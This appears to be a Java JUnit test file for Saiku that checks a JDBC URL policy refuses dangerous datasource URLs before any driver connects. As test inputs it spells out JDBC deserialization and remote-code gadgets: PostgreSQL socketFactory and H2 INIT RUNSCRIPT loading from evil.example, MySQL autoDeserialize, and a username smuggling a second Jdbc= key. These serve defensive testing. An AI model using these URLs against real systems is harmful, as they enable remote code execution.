/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.datasources.connection;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import java.sql.DriverManager;
import java.util.Properties;
import java.util.concurrent.atomic.AtomicBoolean;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.saiku.datasources.datasource.SaikuDatasource;
import org.saiku.service.datasource.JdbcUrlPolicy;

/**
 * saiku#1902 — call-site (wiring) coverage for the connection chokepoint. These drive the REAL
 * {@link SaikuOlapConnection} / {@link SaikuOssieConnection} / {@link SaikuConnectionFactory} —
 * the exact objects {@code SecurityAwareConnectionManager.connect} builds for every datasource,
 * however it was loaded — and prove with a catch-all recording driver that a forbidden URL is
 * refused <em>before</em> {@link DriverManager} consults any driver, while a permitted one still
 * connects.
 */
public class SaikuConnectionPolicyChokepointTest {

    private static final String TEST_SCHEME = "saikutest";

    private static final String PG_GADGET = "jdbc:postgresql://evil.example:5432/db"
            + "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
            + "&socketFactoryArg=http://evil.example/ctx.xml";

    @Rule
    public TemporaryFolder tmp = new TemporaryFolder();

    private RecordingJdbcDriver driver;

    @Before
    public void registerRecordingDriver() throws Exception {
        driver = new RecordingJdbcDriver();
        DriverManager.registerDriver(driver);
        System.setProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY, TEST_SCHEME);
    }

    @After
    public void deregisterRecordingDriver() throws Exception {
        DriverManager.deregisterDriver(driver);
        System.clearProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY);
    }

    /* ---------------------------------------------------------------- OLAP (Mondrian / olap4j) */

    @Test
    public void olapConnection_refusesPostgresSocketFactoryGadget_beforeAnyDriverIsAsked() throws Exception {
        assertRefusedBeforeDriver(new SaikuOlapConnection("evil", olapProps(mondrian(PG_GADGET))));
    }

    @Test
    public void olapConnection_refusesMysqlAutoDeserialize_beforeAnyDriverIsAsked() throws Exception {
        assertRefusedBeforeDriver(new SaikuOlapConnection(
                "evil",
                olapProps(mondrian("jdbc:mysql://evil.example/db?autoDeserialize=true&queryInterceptors=x.Y"))));
    }

    @Test
    public void olapConnection_refusesMysqlHostListSocketFactoryGadget_beforeAnyDriverIsAsked() throws Exception {
        // SEC-confirmed bypass: the denied key rides inside the Connector/J host-property group.
        assertRefusedBeforeDriver(new SaikuOlapConnection(
                "evil", olapProps(mondrian("jdbc:mysql://(host=evil.example,socketFactory=com.evil.Factory)/db"))));
    }

    @Test
    public void olapConnection_refusesH2Init_beforeAnyDriverIsAsked() throws Exception {
        assertRefusedBeforeDriver(new SaikuOlapConnection(
                "evil", olapProps(mondrian("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil.example/p.sql'"))));
    }

    @Test
    public void olapConnection_refusesUnknownScheme_beforeAnyDriverIsAsked() throws Exception {
        assertRefusedBeforeDriver(new SaikuOlapConnection("evil", olapProps("jdbc:evil://h/db")));
    }

    @Test
    public void olapConnection_validatesTheFinalUrl_soCredentialsCannotReinjectJdbc() throws Exception {
        // The descriptor's URL is clean; the USERNAME smuggles a second Jdbc= key, which
        // SaikuOlapConnection appends as ';JdbcUser=<username>;' for the Mondrian driver. A check
        // that ran before the append would pass this. The chokepoint checks the final string.
        Properties props = new Properties();
        props.setProperty(ISaikuConnection.DRIVER_KEY, "mondrian.olap4j.MondrianOlap4jDriver");
        props.setProperty(
                ISaikuConnection.URL_KEY,
                "jdbc:mondrian:Jdbc=jdbc:h2:mem:clean;Catalog=file:/x.xml;JdbcDrivers=org.h2.Driver");
        props.setProperty(ISaikuConnection.USERNAME_KEY, "sa;Jdbc=" + PG_GADGET);
        props.setProperty(ISaikuConnection.PASSWORD_KEY, "");
        assertRefusedBeforeDriver(new SaikuOlapConnection("evil", props));
    }

    @Test
    public void olapConnection_refusesDriverClassThatIsNotADriver_withoutRunningItsStaticInitialiser()
            throws Exception {
        Properties props = olapProps("jdbc:" + TEST_SCHEME + ":ok");
        props.setProperty(ISaikuConnection.DRIVER_KEY, NotADriver.class.getName());
        SaikuOlapConnection con = new SaikuOlapConnection("evil", props);
        try {
            con.connect();
            fail("a non-Driver class must be refused");
        } catch (IllegalArgumentException expected) {
            assertTrue(expected.getMessage(), expected.getMessage().contains("java.sql.Driver"));
        }
        assertFalse("the class must be type-checked BEFORE it is initialised", NOT_A_DRIVER_INITIALISED.get());
        assertEquals(0, driver.connectCalls.get());
    }

    @Test
    public void olapConnection_acceptsPermittedUrl_andConnects() throws Exception {
        SaikuOlapConnection con = new SaikuOlapConnection("ok", olapProps("jdbc:" + TEST_SCHEME + ":ok"));
        assertTrue("a permitted URL must still connect", con.connect());
        assertTrue(con.initialized());
        assertEquals("exactly one driver call", 1, driver.connectCalls.get());
        assertEquals("jdbc:" + TEST_SCHEME + ":ok;", driver.lastUrl);
    }

    /* ---------------------------------------------------------------- OSSIE (Calcite warehouse) */

    @Test
    public void ossieConnection_refusesGadgetWarehouseUrl_beforeAnyDriverIsAsked() throws Exception {
        Properties props = new Properties();
        props.setProperty(
                ISaikuConnection.OSSIE_YAML_KEY, tmp.newFile("model.ossie.yaml").getAbsolutePath());
        props.setProperty(ISaikuConnection.URL_KEY, PG_GADGET);
        props.setProperty(ISaikuConnection.USERNAME_KEY, "u");
        props.setProperty(ISaikuConnection.PASSWORD_KEY, "p");
        assertRefusedBeforeDriver(new SaikuOssieConnection("evil", props));
    }

    @Test
    public void ossieConnection_escapesDescriptorValuesInTheCalciteModel() {
        assertEquals("a\\\"b\\\\c\\nd", SaikuOssieConnection.jsonEscape("a\"b\\c\nd"));
        assertEquals("", SaikuOssieConnection.jsonEscape(null));
    }

    /* ---------------------------------------------------------------- factory (what the manager calls) */

    @Test
    public void connectionFactory_refusesGadgetOlapDatasource_beforeAnyDriverIsAsked() throws Exception {
        SaikuDatasource ds = new SaikuDatasource("evil", SaikuDatasource.Type.OLAP, olapProps(mondrian(PG_GADGET)));
        try {
            SaikuConnectionFactory.getConnection(ds);
            fail("the factory must propagate the policy rejection");
        } catch (IllegalArgumentException expected) {
            assertTrue(expected.getMessage(), expected.getMessage().contains("Invalid datasource JDBC URL"));
        }
        assertEquals("no driver may be consulted for a rejected URL", 0, driver.connectCalls.get());
    }

    @Test
    public void connectionFactory_stillOpensPermittedOlapDatasource() throws Exception {
        SaikuDatasource ds =
                new SaikuDatasource("ok", SaikuDatasource.Type.OLAP, olapProps("jdbc:" + TEST_SCHEME + ":ok"));
        ISaikuConnection con = SaikuConnectionFactory.getConnection(ds);
        assertNotNull("a permitted datasource must yield a live connection", con);
        assertTrue(con.initialized());
        assertEquals(1, driver.connectCalls.get());
    }

    /* ---------------------------------------------------------------- helpers */

    private void assertRefusedBeforeDriver(ISaikuConnection con) throws Exception {
        try {
            con.connect();
            fail("expected the URL policy to refuse the connection");
        } catch (IllegalArgumentException expected) {
            assertTrue(expected.getMessage(), expected.getMessage().contains("Invalid datasource JDBC URL"));
            assertFalse("rejection must not echo the URL", expected.getMessage().contains("evil.example"));
        }
        assertFalse(con.initialized());
        assertEquals("no driver may be consulted for a rejected URL", 0, driver.connectCalls.get());
    }

    private static String mondrian(String inner) {
        return "jdbc:mondrian:Jdbc=" + inner + ";Catalog=file:/tmp/x.xml;JdbcDrivers=org.postgresql.Driver";
    }

    /** OLAP descriptor props using the recording driver as the olap4j driver class. */
    private static Properties olapProps(String location) {
        Properties props = new Properties();
        props.setProperty(ISaikuConnection.DRIVER_KEY, RecordingJdbcDriver.class.getName());
        props.setProperty(ISaikuConnection.URL_KEY, location);
        props.setProperty(ISaikuConnection.USERNAME_KEY, "sa");
        props.setProperty(ISaikuConnection.PASSWORD_KEY, "");
        return props;
    }

    /**
     * Flipped by {@link NotADriver}'s static initialiser. Lives on the OUTER class on purpose:
     * reading a static field of {@code NotADriver} itself would trigger the very initialisation
     * the assertion is checking for.
     */
    static final AtomicBoolean NOT_A_DRIVER_INITIALISED = new AtomicBoolean();

    /** Not a {@link java.sql.Driver}; flips the outer flag if its static initialiser ever runs. */
    public static final class NotADriver {
        static {
            NOT_A_DRIVER_INITIALISED.set(true);
        }
    }
}
